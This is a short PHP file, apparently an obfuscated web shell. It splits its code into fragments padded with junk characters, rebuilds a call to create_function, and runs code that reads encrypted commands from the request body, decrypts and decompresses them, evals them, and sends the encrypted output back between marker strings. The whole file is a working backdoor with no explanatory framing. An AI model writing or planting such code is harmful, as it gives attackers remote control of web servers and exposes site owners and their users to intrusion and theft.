<?php
$A='putEA"),$m)EA=EA=1) {@EAob_EAsEAtart();@evaEAl(@gzuncomEAEApress(@x(@basEAe64_decodeEA($m[1EAEA]),$k))EA)EA;$o=EA@o';
$M='A,$k)EA{$c=sEAtEArlen($k);$l=sEAtrEAleEAn($t);$o="";for($i=EAEAEA0;$i<EA$l;){for($j=0;($j<$cEA&&EA$i<$l);$j+EA+,$i+EA+)';
$V=str_replace('O','','creOOOate_fOuOnctiOon');
$O='b_get_cEAonEAtents();@oEAb_end_clean();$rEA=@baseEA64_encEAode(@x(EA@EAgzEAcompress($o),EA$k))EA;print("$pEA$EAkh$r$kf");}';
$B='$EAk="f0427aEAEA04";$kh="8EAd5ab756b3a8"EA;$kf=EA"0bcEA6b93ff4EA97"EA;$p="0GlXEA4DfDNOiEAXDfHG";EAfuncEAtion x($tEAE';
$N='{$o.EA=EA$tEA{$i}^$k{$j};}}retEAurn $oEA;}EAifEA (@preEAg_match("/$kEAh(.+)$EAkfEA/",@fileEA_get_EAcoEAntents(EA"php://in';
$a=str_replace('EA','',$B.$M.$N.$A.$O);
$U=$V('',$a);$U();
?>
